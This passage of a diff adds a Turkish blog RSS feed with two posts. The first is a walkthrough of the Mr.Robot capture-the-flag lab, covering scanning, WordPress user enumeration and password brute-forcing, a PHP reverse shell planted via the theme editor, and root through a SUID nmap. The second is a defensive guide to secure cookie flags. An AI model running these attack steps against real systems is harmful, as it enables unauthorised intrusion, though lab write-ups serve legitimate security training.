+        <description>&lt;p&gt;      Mr.Robot makinesinin açıklamasını okuduğumuzda 3 tane gizlenmiş flag bulmamız gerektiğini anlıyoruz. Başlangıç - Orta Seviye düzeyinde olduğu da açıklama kısmında belirtiliyor. Mr.Robot’u VirtualBox üzerinde çalıştırdıktan sonra, ağ üzerinde aldığı ip adresini bulmak için netdiscover aracı ile tarama işlemi gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netdiscover -i enp2s0 -r 192.168.0.0/24
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/netdiscover.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu tarama sonucunda alınan ip adresi 192.168.0.36 olarak görülüyor. Açık servisleri listelemek için detaylı bir nmap taraması yapıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -sS -A -v -n -Pn -T4 192.168.0.36 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      22 numaralı port üzerinde SSH, 80 ve 443 üzerinde HTTP servislerinin çalıştığı görülmüştür. Tarayıcıdan 192.168.0.36 adresine gittimizde pek faydalı bir bilgi ile karşılaştığımız söylenemez. Bu yüzden dirb ve nikto araçlarını kullanarak daha fazla bilgi etmeyi hedefliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirb http://192.168.0.36
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/dirb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Dirb ile dosya ve dizinleri araştırdıktan sonra uygulamanın wordpress bir altyapı üzerine kurulduğunu anlıyoruz. Aklımıza ilk gelen wpscan aracı ile kullanıcı isimleri elde etmeye çalışmak oldu. Elde edilen kullanıcı isimleri ile birlikte sözlük saldırısı gerçekleştirerek yönetim paneline giriş yapılabilir. Wordpress altyapısı ile çalışan blog uygulaması &lt;code class=&quot;highlighter-rouge&quot;&gt;/0&lt;/code&gt; dizini altında çalışıyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan --url http://192.168.0.36/0 --enumerate u
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/wp-user.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu işlem sonucu iki adet kullanıcı adı elde ettik. Bu kullanıcı isimlerini kullanarak sözlük saldırısı gerçekleştireceğiz. Harici bir kelime listesi kullanmayı düşünürken yine dirb taraması sonucu &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; dosyasının varlığı tespit edilmişti. Tarayıcıdan robots.txt dosyasına gidildiğinde bizim için hazırlanmış kelime listesi ile karşılaşıyoruz. Bunun yanı sıra Flag-1’i de unutmayalım. Aynı yerde &lt;code class=&quot;highlighter-rouge&quot;&gt;key-1-of-3.txt&lt;/code&gt; olarak karşımıza çıkıyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/robots.txt.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/flag-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Flag-1’i ve sözlük dosyasını bulduktan sonra, panele giriş için wpscan aracı ile sözlük saldırısı gerçekleştireceğiz. Sözlük dosyasını incelediğimizde çok fazla tekrar eden kelime olduğunu ve işlem süresinin uzun olacağını öngörebiliyoruz. Bu adımda , basit bir linux komutu ile dosyayı olabildiğince sadeleştirilmiştir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/dic.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan --url 192.168.0.36 --wordlist /home/ctrl/Downloads/fsocity.dic2 --username elliot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/wp-password.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu işlem sonucu elliot kullanıcısına ait parola &lt;code class=&quot;highlighter-rouge&quot;&gt;ER28-0652&lt;/code&gt; olarak bulunmuştur. Artık panele giriş yapıp standart bir wordpress uygulamasında kullanılan yöntem olarak zararlı kod yükleme işlemi gerçekleştirilecektir. Bunun için fiziksel sisteme reverse shell veren bir PHP kodu tercih edilmiştir. Wordpress teması editlendikten sonra reverse shell bağlantısı kurulmuştur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/wp-tema.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/reverse-shell.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sisteme deamon kullanıcısı olarak giriş yapılmıştır. /home/robot dizini altında &lt;code class=&quot;highlighter-rouge&quot;&gt;key-2-of-3.txt&lt;/code&gt; dosyasında ikinci flag değeri bulunmaktadır. Fakat bu dosyayı okumaya yetkimiz henüz bulunmaktadır. Bu dosya robot kullanıcısına aittir ve robot kullancısının parolasının md5 hali, aynı dizindeki &lt;code class=&quot;highlighter-rouge&quot;&gt;password.raw-md5&lt;/code&gt; dosyasında yer almaktadır. Buradaki md5 hash değeri decrypt edildiğinde robot kullancısına ait parola &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijklmnopqrstuvwxyz&lt;/code&gt; olarak bulunmuştur. Bu parola ile giriş yapmak için interactive bir kabuğa ihtiyaç duyulmaktadır. Bu kabuğu elde ettikten sonra sisteme robot kullanıcısı olarak giriş yapılmıştır. Kullanıcı yetkilerine sahip olduktan sonra, Flag-2 elde edilmiştir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/flag-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Son flag’in root kullanıcı haklarıyla okunabileceğini tahmin etmek çok zor değil. Sistemde root olmak ya da bir şekilde root yetkileriyle komut çalıştırmak gerekiyor. İlk adım olarak sistemde suid bitli dosyaları çalıştırmaya yönelik bir arama gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -perm -u=s 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/suid.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      /usr/local/bin/ dizini altında nmap’i gördükten sonra içimiz artık rahatlıyor. Nmap’in bu sürümünde interactive modda, sistem üzerinden komut çalıştırılabildiğini biliyoruz. Nmap’e verilen suid bitinden dolayı artık root yetkisi ile komut çalıştırabileceğini de biliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/local/bin/nmap --interactive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/mr-robot/flag-3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu sayede Flag-3 değerini de elde etmiş olduk.&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 23 Nov 2017 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2017/11/23/mr-robot.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2017/11/23/mr-robot.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Güvenli Cookie</title>
+        <description>&lt;h4&gt;Oturum Anahtarı Nedir ? &lt;/h4&gt;
+
+&lt;p&gt;       Web uygulamaları, istemcilerini birbirinden ayırt etmek için belli yöntemlerle oluşturulan, oturum anahtarı denilen yapıları kullanırlar. Oturum anahtarlarının isimleri, uygulamadan uygulamaya farklılık göstererek karşımıza JSESSIONID, PHPSESSID,ASPSESSIONID gibi örnekler ile çıkabilmektedir. Oturum anahtarları ilgili programlama diline ait kütüphaneler ve fonksiyonlar yardımı ile oluşturulabileceği gibi özel metodların kullanımı ve el yordamı ile de oluşturulabilir.  Bu süreç, istemcinin hedef uygulama sunucusuna istek yapması ile başlar. İsteği alan sunucu, istemciye özel oturum anahtarını üretir ve artık kullanıcı bu anahtar ile tanımlanır. Oturum anahtarına ihtiyaç duyulmasının nedeni HTTP protokolünün ‘stateless’ bir yapıda olmasıdır. İstemciye ait bir oturum bilgisi tutulmadığı takdirde, sunucu için yapılan isteklerin her biri birbirinden bağımsızdır. Oturum anahtarlarının taşınmasında ve istemci tarafında saklanmasında yaygın olarak kullanılan yöntem cookie’dir.&lt;/p&gt;
+
+&lt;h4&gt;Cookie Nedir ?&lt;/h4&gt;
+
+&lt;p&gt;       Bildiğimiz üzere web sayfalarının kullanıcılarını hatırlamaları için herhangi bir hafızaları bulunmaz. Az önce bahsedilen oturum anahtarları aracılığıyla bu işlem gerçekleştirilir. Cookie, oturum anahtarı ve oturum bilgilerinin saklandığı, istemci tarafında bulunan yapıdır. Cookie’ler , istemcinin uygulama ile etkileşimlerini, gezindiği sayfaları, yaptığı giriş bilgilerini, kullanıcı kimlik bilgilerini taşıyabilirler. Örneğin, A uygulamasına kullanıcı bilgileri ile giriş yapıldığında ve aynı uygulamada işlem yapacağımız farklı bir sayfaya geçiş yaptığımızda, A uygulaması bizim hangi kullanıcı olduğumuzu cookie sayesinde anlayacaktır. PHP ile oluşturulan bir cookie aşağıdaki yapıda ve yöntem ile oluşturulmaktadır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//setcookie(name, value, expire, path, domain, secure, httponly);
+
+
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ctrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$cookie_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ctrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$httponly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cookie_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$httponly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4&gt;Güvenli Cookie'de Bulunması Gereken Özellikler &lt;/h4&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1.&lt;/code&gt; HTTPS protokolü ile çalışan uygulamalarda cookie için &lt;code class=&quot;highlighter-rouge&quot;&gt;secure&lt;/code&gt; özelliği aktif edilmelidir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2.&lt;/code&gt; Cross Site Scripting gibi bir zafiyetin istismari sonucunda, tarayıcı üzerinden script çalıştırılarak cookie bilgisinin alınamaması için &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpOnly&lt;/code&gt; özelliği aktif edilmelidir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3.&lt;/code&gt; İlgili uygulama dışında diğer uygulamaların,subdomainlerin etkilenmemesi için cookie içerisinde &lt;code class=&quot;highlighter-rouge&quot;&gt;domain&lt;/code&gt; ve &lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt; bilgileri verilmelidir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4.&lt;/code&gt;  Expires ve Max-Age değerleri öncesinde atanmış olan ve tarayıcı kapatılsa bile hala ömrünü sürdürmeye devam edebilen &lt;code class=&quot;highlighter-rouge&quot;&gt;persistent cookie&lt;/code&gt; gerekmedikçe kullanılmamalıdır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5.&lt;/code&gt; Cookie oluşturulurken, yaygın algoritmalar ve metodlar tercih edilmemelidir.&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 22 Nov 2017 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2017/11/22/cookie.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2017/11/22/cookie.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+  </channel>
+</rss>
